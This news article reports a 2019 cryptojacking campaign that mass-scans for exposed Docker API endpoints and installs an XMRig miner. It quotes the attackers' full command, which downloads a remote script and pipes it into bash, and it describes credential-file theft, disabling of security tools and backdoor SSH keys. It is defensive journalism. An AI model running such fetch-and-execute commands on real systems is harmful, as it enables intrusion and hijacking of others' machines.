---
title: 'A hacking group is hijacking Docker systems with exposed API endpoints'
date: 2019-11-26T03:31:00+01:00
draft: false
---

![Docker](https://zdnet2.cbsistatic.com/hub/i/2019/02/07/0ff7b41e-cfa3-4282-bcb8-2192012a5fae/14e37398dcede71776ea8b1a8b919f19/05-docker.png)

Image: Docker, ZDNet

A hacking group is currently mass-scanning the internet looking for Docker platforms that have API endpoints exposed online.

The purpose of these scans is to allow the hacker group to send commands to the Docker instance and deploy a cryptocurrency miner on a company's [Docker instances](https://en.wikipedia.org/wiki/Docker_(software)), to generate funds for the group's own profits.

### A professional operation

This particular mass-scanning operation started over the weekend, on November 24, and immediately stood out due to its sheer size.

"Users of the Bad Packets CTI API will note that exploit activity targeting exposed Docker instances is nothing new and happens quite often," Troy Mursch, CTO and co-founder of Bad Packets LLC, told ZDNet today.

"What set this campaign apart was the large uptick of scanning activity. This alone warranted further investigation to find out what this botnet was up to," he said.

"As others have noted \[[1](https://twitter.com/n0x08/status/1199108380326912001), [2](https://twitter.com/2sec4u/status/1199090117153116160)\], this isn't your average script kiddie exploit attempt," Mursch, who discovered the campaign, told us. "There was a moderate level of effort put into this campaign, and we haven't fully analyzed every single thing it does as of yet."

### What we know so far

What we know so far is that the group behind these attacks is currently scanning more than 59,000 IP networks (netblocks) looking for exposed Docker instances.

Once the group identifies an exposed host, attackers use the API endpoint to start an Alpine Linux OS container where they run the following command:

_chroot /mnt /bin/sh -c 'curl -sL4 http://ix.io/1XQa | bash;_

The above command downloads and runs a Bash script from the attackers' server. This script installs a classic XMRRig cryptocurrency miner. In the two days since this campaign has been active, hackers have already mined 14.82 Monero coins (XMR), worth just over $740, Mursch noted.

![docker-campaign-xmrhunter.png](https://www.zdnet.com/article/a-hacking-group-is-hijacking-docker-systems-with-exposed-api-endpoints/#ftag=RSSbaffb68)

<span><img src="https://zdnet1.cbsistatic.com/hub/i/2019/11/26/6a9cd3b9-7933-4125-b9b8-e2ecc580d2c8/a9e23f6e378e0d97e4dec1ddc65d8d7c/docker-campaign-xmrhunter.png" alt="docker-campaign-xmrhunter.png" /></span>

In addition, this malware operation also comes with a self-defense measure.

"One unoriginal but interesting function of the campaign is that it uninstalls known monitoring agents and kills a bunch of processes via a script downloaded from http://ix\[.\]io/1XQh," Mursch told us.

Looking through this script, we not only see that hackers are disabling security products, but they're shutting down lso processes associated with rival cryptocurrency-mining botnets, such as [DDG](https://blog.netlab.360.com/ddg-a-mining-botnet-aiming-at-database-server-en/).

In addition, Mursch also discovered a function of the malicious script that scans an infected host for [rConfig](https://www.rconfig.com/) configuration files, which it encrypts and steals, sending the files back to the group's command and control server.

Furthermore, Craig H. Rowland, founder of Sandfly Security, [has also noticed](https://twitter.com/CraigHRowland/status/1199140322007121921) that hackers are also creating backdoor accounts on the hacked containers, and leaving SSH keys behind for easier access, and a way to control all infected bots from a remote location.

For the time being, Mursch recommends that users and organizations who run Docker instances immediately check if they are exposing API endpoints on the internet, close the ports, and then terminate unrecognized running containers.

  
  
from Latest Topic for ZDNet in... https://ift.tt/2OkK1x6